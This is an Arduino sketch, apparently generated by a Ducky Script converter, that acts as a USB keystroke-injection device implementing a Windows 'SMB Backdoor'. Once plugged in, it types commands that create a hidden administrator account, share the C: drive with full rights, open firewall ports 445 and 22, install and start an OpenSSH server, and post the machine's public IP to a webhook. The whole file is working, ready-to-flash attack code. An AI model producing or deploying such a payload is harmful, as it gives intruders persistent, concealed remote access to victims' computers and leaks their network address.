// [ ===== Created using duckify.huhn.me @ dev 89adab6e ===== ] //
// Duckify is a free and Open-Source web-app for converting Ducky Script into Arduino code.
// Please consider supporting us on ko-fi.com/spacehuhn <3
// Learn more about us at spacehuhn.com

// Platform: Arduino
// Keyboard Layout: US


#include <HID.h>

namespace keyboard {
    typedef struct report {
        uint8_t modifiers;
        uint8_t reserved;
        uint8_t keys[6];
    } report;
    
    report prev_report = report { 0x00, 0x00, { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 } };
    
    const uint8_t keyboardDescriptor[] PROGMEM {
        0x05, 0x01, 0x09, 0x06, 0xa1, 0x01, 0x85, 0x02, 0x05, 0x07, 0x19, 0xe0, 0x29, 0xe7, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x08, 0x81, 0x02, 0x95, 0x01, 0x75, 0x08, 0x81, 0x03, 0x95, 0x06, 0x75, 0x08, 0x15, 0x00, 0x25, 0x73, 0x05, 0x07, 0x19, 0x00, 0x29, 0x73, 0x81, 0x00, 0xc0,
    };
    
    report makeReport(uint8_t modifiers = 0, uint8_t key1 = 0, uint8_t key2 = 0, uint8_t key3 = 0, uint8_t key4 = 0, uint8_t key5 = 0, uint8_t key6 = 0);
    
    report makeReport(uint8_t modifiers, uint8_t key1, uint8_t key2, uint8_t key3, uint8_t key4, uint8_t key5, uint8_t key6) {
        return report { modifiers, 0x00, { key1, key2, key3, key4, key5, key6 } };
    }
    
    void begin() {
        static HIDSubDescriptor node(keyboardDescriptor, sizeof(keyboardDescriptor));
        HID().AppendDescriptor(&node);
    }
    
    void send(report* k) {
        HID().SendReport(2, (uint8_t*)k, sizeof(report));
    }
    
    void release() {
        prev_report = makeReport();
        send(&prev_report);
    }

    void type(uint8_t key0, uint8_t key1, uint8_t key2, uint8_t key3, uint8_t key4, uint8_t key5, uint8_t modifiers) {
        prev_report.keys[0] = key0;
        prev_report.keys[1] = key1;
        prev_report.keys[2] = key2;
        prev_report.keys[3] = key3;
        prev_report.keys[4] = key4;
        prev_report.keys[5] = key5;
        prev_report.modifiers = modifiers;
        send(&prev_report);
        release();
    }
}


// cmd
const uint8_t key_arr_0[] PROGMEM = {0,6, 0,16, 0,7};
// NET USER ADMIN2 ADMIN2_PASS /ADD
const uint8_t key_arr_1[] PROGMEM = {2,17, 2,8, 2,23, 0,44, 2,24, 2,22, 2,8, 2,21, 0,44, 2,4, 2,7, 2,16, 2,12, 2,17, 0,31, 0,44, 2,4, 2,7, 2,16, 2,12, 2,17, 0,31, 2,45, 2,19, 2,4, 2,22, 2,22, 0,44, 0,56, 2,4, 2,7, 2,7};
// NET LOCALGROUP Administrators ADMIN2 /ADD
const uint8_t key_arr_2[] PROGMEM = {2,17, 2,8, 2,23, 0,44, 2,15, 2,18, 2,6, 2,4, 2,15, 2,10, 2,21, 2,18, 2,24, 2,19, 0,44, 2,4, 0,7, 0,16, 0,12, 0,17, 0,12, 0,22, 0,23, 0,21, 0,4, 0,23, 0,18, 0,21, 0,22, 0,44, 2,4, 2,7, 2,16, 2,12, 2,17, 0,31, 0,44, 0,56, 2,4, 2,7, 2,7};
// NET SHARE RD_SHARE=C:bslash /GRANT:ADMIN2,FULL /REMARK:"RRemote DShare"
const uint8_t key_arr_3[] PROGMEM = {2,17, 2,8, 2,23, 0,44, 2,22, 2,11, 2,4, 2,21, 2,8, 0,44, 2,21, 2,7, 2,45, 2,22, 2,11, 2,4, 2,21, 2,8, 0,46, 2,6, 2,51, 0,49, 0,44, 0,56, 2,10, 2,21, 2,4, 2,17, 2,23, 2,51, 2,4, 2,7, 2,16, 2,12, 2,17, 0,31, 0,54, 2,9, 2,24, 2,15, 2,15, 0,44, 0,56, 2,21, 2,8, 2,16, 2,4, 2,21, 2,14, 2,51, 2,52, 2,21, 2,21, 0,8, 0,16, 0,18, 0,23, 0,8, 0,44, 2,7, 2,22, 0,11, 0,4, 0,21, 0,8, 2,52};
// NETSH ADVFIREWALL FIREWALL ADD RULE NAME="Server Message Block for RD" PROTOCOL=TCP LOCALPORT=445 DIR=IN ACTION=ALLOW PROFILE=PUBLIC,PRIVATE,DOMAIN
const uint8_t key_arr_4[] PROGMEM = {2,17, 2,8, 2,23, 2,22, 2,11, 0,44, 2,4, 2,7, 2,25, 2,9, 2,12, 2,21, 2,8, 2,26, 2,4, 2,15, 2,15, 0,44, 2,9, 2,12, 2,21, 2,8, 2,26, 2,4, 2,15, 2,15, 0,44, 2,4, 2,7, 2,7, 0,44, 2,21, 2,24, 2,15, 2,8, 0,44, 2,17, 2,4, 2,16, 2,8, 0,46, 2,52, 2,22, 0,8, 0,21, 0,25, 0,8, 0,21, 0,44, 2,16, 0,8, 0,22, 0,22, 0,4, 0,10, 0,8, 0,44, 2,5, 0,15, 0,18, 0,6, 0,14, 0,44, 0,9, 0,18, 0,21, 0,44, 2,21, 2,7, 2,52, 0,44, 2,19, 2,21, 2,18, 2,23, 2,18, 2,6, 2,18, 2,15, 0,46, 2,23, 2,6, 2,19, 0,44, 2,15, 2,18, 2,6, 2,4, 2,15, 2,19, 2,18, 2,21, 2,23, 0,46, 0,33, 0,33, 0,34, 0,44, 2,7, 2,12, 2,21, 0,46, 2,12, 2,17, 0,44, 2,4, 2,6, 2,23, 2,12, 2,18, 2,17, 0,46, 2,4, 2,15, 2,15, 2,18, 2,26, 0,44, 2,19, 2,21, 2,18, 2,9, 2,12, 2,15, 2,8, 0,46, 2,19, 2,24, 2,5, 2,15, 2,12, 2,6, 0,54, 2,19, 2,21, 2,12, 2,25, 2,4, 2,23, 2,8, 0,54, 2,7, 2,18, 2,16, 2,4, 2,12, 2,17};
// REG ADD "HKEY_LOCAL_MACHINEbslashSOFTWAREbslashMicrosoftbslashWindowsbslashCurrentVersionbslashPoliciesbslashSystem" /f /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1
const uint8_t key_arr_5[] PROGMEM = {2,21, 2,8, 2,10, 0,44, 2,4, 2,7, 2,7, 0,44, 2,52, 2,11, 2,14, 2,8, 2,28, 2,45, 2,15, 2,18, 2,6, 2,4, 2,15, 2,45, 2,16, 2,4, 2,6, 2,11, 2,12, 2,17, 2,8, 0,49, 2,22, 2,18, 2,9, 2,23, 2,26, 2,4, 2,21, 2,8, 0,49, 2,16, 0,12, 0,6, 0,21, 0,18, 0,22, 0,18, 0,9, 0,23, 0,49, 2,26, 0,12, 0,17, 0,7, 0,18, 0,26, 0,22, 0,49, 2,6, 0,24, 0,21, 0,21, 0,8, 0,17, 0,23, 2,25, 0,8, 0,21, 0,22, 0,12, 0,18, 0,17, 0,49, 2,19, 0,18, 0,15, 0,12, 0,6, 0,12, 0,8, 0,22, 0,49, 2,22, 0,28, 0,22, 0,23, 0,8, 0,16, 2,52, 0,44, 0,56, 0,9, 0,44, 0,56, 0,25, 0,44, 2,15, 0,18, 0,6, 0,4, 0,15, 2,4, 0,6, 0,6, 0,18, 0,24, 0,17, 0,23, 2,23, 0,18, 0,14, 0,8, 0,17, 2,9, 0,12, 0,15, 0,23, 0,8, 0,21, 2,19, 0,18, 0,15, 0,12, 0,6, 0,28, 0,44, 0,56, 0,23, 0,44, 2,21, 2,8, 2,10, 2,45, 2,7, 2,26, 2,18, 2,21, 2,7, 0,44, 0,56, 0,7, 0,44, 0,30};
// REG ADD "HKEY_LOCAL_MACHINEbslashSOFTWAREbslashMicrosoftbslashWindows NTbslashCurrentVersionbslashWinlogonbslashSpecialAccountsbslashUserList" /f /v ADMIN2 /t REG_DWORD /d 0
const uint8_t key_arr_6[] PROGMEM = {2,21, 2,8, 2,10, 0,44, 2,4, 2,7, 2,7, 0,44, 2,52, 2,11, 2,14, 2,8, 2,28, 2,45, 2,15, 2,18, 2,6, 2,4, 2,15, 2,45, 2,16, 2,4, 2,6, 2,11, 2,12, 2,17, 2,8, 0,49, 2,22, 2,18, 2,9, 2,23, 2,26, 2,4, 2,21, 2,8, 0,49, 2,16, 0,12, 0,6, 0,21, 0,18, 0,22, 0,18, 0,9, 0,23, 0,49, 2,26, 0,12, 0,17, 0,7, 0,18, 0,26, 0,22, 0,44, 2,17, 2,23, 0,49, 2,6, 0,24, 0,21, 0,21, 0,8, 0,17, 0,23, 2,25, 0,8, 0,21, 0,22, 0,12, 0,18, 0,17, 0,49, 2,26, 0,12, 0,17, 0,15, 0,18, 0,10, 0,18, 0,17, 0,49, 2,22, 0,19, 0,8, 0,6, 0,12, 0,4, 0,15, 2,4, 0,6, 0,6, 0,18, 0,24, 0,17, 0,23, 0,22, 0,49, 2,24, 0,22, 0,8, 0,21, 2,15, 0,12, 0,22, 0,23, 2,52, 0,44, 0,56, 0,9, 0,44, 0,56, 0,25, 0,44, 2,4, 2,7, 2,16, 2,12, 2,17, 0,31, 0,44, 0,56, 0,23, 0,44, 2,21, 2,8, 2,10, 2,45, 2,7, 2,26, 2,18, 2,21, 2,7, 0,44, 0,56, 0,7, 0,44, 0,39};
// EXIT
const uint8_t key_arr_7[] PROGMEM = {2,8, 2,27, 2,12, 2,23};
// powershell -windowstyle hidden
const uint8_t key_arr_8[] PROGMEM = {0,19, 0,18, 0,26, 0,8, 0,21, 0,22, 0,11, 0,8, 0,15, 0,15, 0,44, 0,45, 0,26, 0,12, 0,17, 0,7, 0,18, 0,26, 0,22, 0,23, 0,28, 0,15, 0,8, 0,44, 0,11, 0,12, 0,7, 0,7, 0,8, 0,17};
// Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
const uint8_t key_arr_9[] PROGMEM = {2,4, 0,7, 0,7, 0,45, 2,26, 0,12, 0,17, 0,7, 0,18, 0,26, 0,22, 2,6, 0,4, 0,19, 0,4, 0,5, 0,12, 0,15, 0,12, 0,23, 0,28, 0,44, 0,45, 2,18, 0,17, 0,15, 0,12, 0,17, 0,8, 0,44, 0,45, 2,17, 0,4, 0,16, 0,8, 0,44, 2,18, 0,19, 0,8, 0,17, 2,22, 2,22, 2,11, 0,55, 2,22, 0,8, 0,21, 0,25, 0,8, 0,21, 2,53, 2,53, 2,53, 2,53, 0,39, 0,55, 0,39, 0,55, 0,30, 0,55, 0,39};
// Start-Service sshd
const uint8_t key_arr_10[] PROGMEM = {2,22, 0,23, 0,4, 0,21, 0,23, 0,45, 2,22, 0,8, 0,21, 0,25, 0,12, 0,6, 0,8, 0,44, 0,22, 0,22, 0,11, 0,7};
// Set-Service -Name sshd -StartupType 'Automatic'
const uint8_t key_arr_11[] PROGMEM = {2,22, 0,8, 0,23, 0,45, 2,22, 0,8, 0,21, 0,25, 0,12, 0,6, 0,8, 0,44, 0,45, 2,17, 0,4, 0,16, 0,8, 0,44, 0,22, 0,22, 0,11, 0,7, 0,44, 0,45, 2,22, 0,23, 0,4, 0,21, 0,23, 0,24, 0,19, 2,23, 0,28, 0,19, 0,8, 0,44, 0,52, 2,4, 0,24, 0,23, 0,18, 0,16, 0,4, 0,23, 0,12, 0,6, 0,52};
// New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled true -Protocol TCP -Action Allow -LocalPort 22
const uint8_t key_arr_12[] PROGMEM = {2,17, 0,8, 0,26, 0,45, 2,17, 0,8, 0,23, 2,9, 0,12, 0,21, 0,8, 0,26, 0,4, 0,15, 0,15, 2,21, 0,24, 0,15, 0,8, 0,44, 0,45, 2,17, 0,4, 0,16, 0,8, 0,44, 0,22, 0,22, 0,11, 0,7, 0,44, 0,45, 2,7, 0,12, 0,22, 0,19, 0,15, 0,4, 0,28, 2,17, 0,4, 0,16, 0,8, 0,44, 0,52, 2,18, 0,19, 0,8, 0,17, 2,22, 2,22, 2,11, 0,44, 2,22, 0,8, 0,21, 0,25, 0,8, 0,21, 0,44, 2,38, 0,22, 0,22, 0,11, 0,7, 2,39, 0,52, 0,44, 0,45, 2,8, 0,17, 0,4, 0,5, 0,15, 0,8, 0,7, 0,44, 0,23, 0,21, 0,24, 0,8, 0,44, 0,45, 2,19, 0,21, 0,18, 0,23, 0,18, 0,6, 0,18, 0,15, 0,44, 2,23, 2,6, 2,19, 0,44, 0,45, 2,4, 0,6, 0,23, 0,12, 0,18, 0,17, 0,44, 2,4, 0,15, 0,15, 0,18, 0,26, 0,44, 0,45, 2,15, 0,18, 0,6, 0,4, 0,15, 2,19, 0,18, 0,21, 0,23, 0,44, 0,31, 0,31};
// $webhook = "YOUR_WEBHOOK_HERE"; 
const uint8_t key_arr_13[] PROGMEM = {2,33, 0,26, 0,8, 0,5, 0,11, 0,18, 0,18, 0,14, 0,44, 0,46, 0,44, 2,52, 2,28, 2,18, 2,24, 2,21, 2,45, 2,26, 2,8, 2,5, 2,11, 2,18, 2,18, 2,14, 2,45, 2,11, 2,8, 2,21, 2,8, 2,52, 0,51, 0,44};
// $output = Invoke-RestMethod -Uri "https://api.ipify.org?format=json" -Method Get | ConvertTo-Json -Depth 10; 
const uint8_t key_arr_14[] PROGMEM = {2,33, 0,18, 0,24, 0,23, 0,19, 0,24, 0,23, 0,44, 0,46, 0,44, 2,12, 0,17, 0,25, 0,18, 0,14, 0,8, 0,45, 2,21, 0,8, 0,22, 0,23, 2,16, 0,8, 0,23, 0,11, 0,18, 0,7, 0,44, 0,45, 2,24, 0,21, 0,12, 0,44, 2,52, 0,11, 0,23, 0,23, 0,19, 0,22, 2,51, 0,56, 0,56, 0,4, 0,19, 0,12, 0,55, 0,12, 0,19, 0,12, 0,9, 0,28, 0,55, 0,18, 0,21, 0,10, 2,56, 0,9, 0,18, 0,21, 0,16, 0,4, 0,23, 0,46, 0,13, 0,22, 0,18, 0,17, 2,52, 0,44, 0,45, 2,16, 0,8, 0,23, 0,11, 0,18, 0,7, 0,44, 2,10, 0,8, 0,23, 0,44, 2,49, 0,44, 2,6, 0,18, 0,17, 0,25, 0,8, 0,21, 0,23, 2,23, 0,18, 0,45, 2,13, 0,22, 0,18, 0,17, 0,44, 0,45, 2,7, 0,8, 0,19, 0,23, 0,11, 0,44, 0,30, 0,39, 0,51, 0,44};
// Invoke-RestMethod -Uri $webhook -Method Post -Body (@{content=$output} | ConvertTo-Json -Depth 10) -ContentType "application/json"
const uint8_t key_arr_15[] PROGMEM = {2,12, 0,17, 0,25, 0,18, 0,14, 0,8, 0,45, 2,21, 0,8, 0,22, 0,23, 2,16, 0,8, 0,23, 0,11, 0,18, 0,7, 0,44, 0,45, 2,24, 0,21, 0,12, 0,44, 2,33, 0,26, 0,8, 0,5, 0,11, 0,18, 0,18, 0,14, 0,44, 0,45, 2,16, 0,8, 0,23, 0,11, 0,18, 0,7, 0,44, 2,19, 0,18, 0,22, 0,23, 0,44, 0,45, 2,5, 0,18, 0,7, 0,28, 0,44, 2,38, 2,31, 2,47, 0,6, 0,18, 0,17, 0,23, 0,8, 0,17, 0,23, 0,46, 2,33, 0,18, 0,24, 0,23, 0,19, 0,24, 0,23, 2,48, 0,44, 2,49, 0,44, 2,6, 0,18, 0,17, 0,25, 0,8, 0,21, 0,23, 2,23, 0,18, 0,45, 2,13, 0,22, 0,18, 0,17, 0,44, 0,45, 2,7, 0,8, 0,19, 0,23, 0,11, 0,44, 0,30, 0,39, 2,39, 0,44, 0,45, 2,6, 0,18, 0,17, 0,23, 0,8, 0,17, 0,23, 2,23, 0,28, 0,19, 0,8, 0,44, 2,52, 0,4, 0,19, 0,19, 0,15, 0,12, 0,6, 0,4, 0,23, 0,12, 0,18, 0,17, 0,56, 0,13, 0,22, 0,18, 0,17, 2,52};
// exit
const uint8_t key_arr_16[] PROGMEM = {0,8, 0,27, 0,12, 0,23};

void duckyString(const uint8_t* keys, size_t len) {  
    for(size_t i=0; i<len; i+=2) {
        keyboard::type(pgm_read_byte_near(keys + i+1), 0, 0, 0, 0, 0, pgm_read_byte_near(keys + i));
    }
}

void setup() {
    keyboard::begin();
    delay(2000);

    // # Title:            "Microsoft Windows" SMB Backdoor
    // # Description:      
    // #                   1) Adds a user account (ADMIN2:ADMIN2_PASS).
    // #                   2) Adds this local user to the local administrator group.
    // #                   3) Shares "C:" directory (RD_SHARE).
    // #                   4) Adds a rule to the firewall.
    // #                   5) Sets a value to "LocalAccountTokenFilterPolicy" to access the "C:" with a local account.
    // #                   6) Hides this user account.
    // #
    // # Author:           TW-D
    // # Editor:           Eclipse
    // # Version:          1.2
    // # Category:         Remote Access
    // # Target:           Microsoft Windows
    // #
    // # TESTED ON
    // # ===============
    // # Microsoft Windows 10 Family Version 20H2 (PowerShell 5.1)
    // # Microsoft Windows 10 Professional Version 20H2 (PowerShell 5.1)
    // # Microsoft Windows 10 (tiny 10)
    // #
    // # REQUIREMENTS
    // # ===============
    // # The target user must belong to the 'Administrators' group.
    // #
    // ######## INITIALIZATION ########
    delay(500); // DELAY 500
    // ######## STAGE1 ########
    keyboard::type(21, 0, 0, 0, 0, 0, 8); // GUI r
    delay(3000); // DELAY 3000
    duckyString(key_arr_0, sizeof(key_arr_0)); // STRING cmd
    delay(300); // DELAY 300
    keyboard::type(40, 0, 0, 0, 0, 0, 3); // CTRL SHIFT ENTER
    delay(300); // DELAY 300
    keyboard::type(43, 0, 0, 0, 0, 0, 0); // TAB
    delay(100); // DELAY 100
    keyboard::type(80, 0, 0, 0, 0, 0, 0); // LEFTARROW
    delay(100); // DELAY 100
    keyboard::type(80, 0, 0, 0, 0, 0, 0); // LEFTARROW
    delay(100); // DELAY 100
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    // ######## STAGE2 ########
    duckyString(key_arr_1, sizeof(key_arr_1)); // STRING NET USER ADMIN2 ADMIN2_PASS /ADD
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(1500); // DELAY 1500
    duckyString(key_arr_2, sizeof(key_arr_2)); // STRING NET LOCALGROUP Administrators ADMIN2 /ADD
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(300); // DELAY 300
    // ######## STAGE3 ########
    duckyString(key_arr_3, sizeof(key_arr_3)); // STRING NET SHARE RD_SHARE=C:bslash /GRANT:ADMI...
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(300); // DELAY 300
    duckyString(key_arr_4, sizeof(key_arr_4)); // STRING NETSH ADVFIREWALL FIREWALL ADD RULE NAM...
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(300); // DELAY 300
    // ######## STAGE4 ########
    duckyString(key_arr_5, sizeof(key_arr_5)); // STRING REG ADD "HKEY_LOCAL_MACHINEbslashSOFTWA...
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(300); // DELAY 300
    duckyString(key_arr_6, sizeof(key_arr_6)); // STRING REG ADD "HKEY_LOCAL_MACHINEbslashSOFTWA...
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(300); // DELAY 300
    // ######## FINISH ########
    duckyString(key_arr_7, sizeof(key_arr_7)); // STRING EXIT
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    keyboard::type(21, 0, 0, 0, 0, 0, 8); // GUI r
    delay(200); // DELAY 200
    duckyString(key_arr_8, sizeof(key_arr_8)); // STRING powershell -windowstyle hidden
    delay(200); // DELAY 200
    keyboard::type(40, 0, 0, 0, 0, 0, 3); // CTRL SHIFT ENTER
    delay(100); // DELAY 100
    keyboard::type(43, 0, 0, 0, 0, 0, 8); // GUI TAB
    delay(300); // DELAY 300
    keyboard::type(80, 0, 0, 0, 0, 0, 0); // LEFTARROW
    delay(100); // DELAY 100
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(300); // DELAY 300
    duckyString(key_arr_9, sizeof(key_arr_9)); // STRING Add-WindowsCapability -Online -Name Ope...
    delay(250); // DELAY 250
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    duckyString(key_arr_10, sizeof(key_arr_10)); // STRING Start-Service sshd
    delay(175); // DELAY 175
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    duckyString(key_arr_11, sizeof(key_arr_11)); // STRING Set-Service -Name sshd -StartupType 'Au...
    delay(200); // DELAY 200
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    duckyString(key_arr_12, sizeof(key_arr_12)); // STRING New-NetFirewallRule -Name sshd -Display...
    delay(400); // DELAY 400
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    duckyString(key_arr_13, sizeof(key_arr_13)); // STRING $webhook = "YOUR_WEBHOOK_HERE"; 
    duckyString(key_arr_14, sizeof(key_arr_14)); // STRING $output = Invoke-RestMethod -Uri "https...
    duckyString(key_arr_15, sizeof(key_arr_15)); // STRING Invoke-RestMethod -Uri $webhook -Method...
    delay(425); // DELAY 425
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    duckyString(key_arr_16, sizeof(key_arr_16)); // STRING exit
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
}

void loop() {}

// Created using duckify.huhn.me @ dev 89adab6e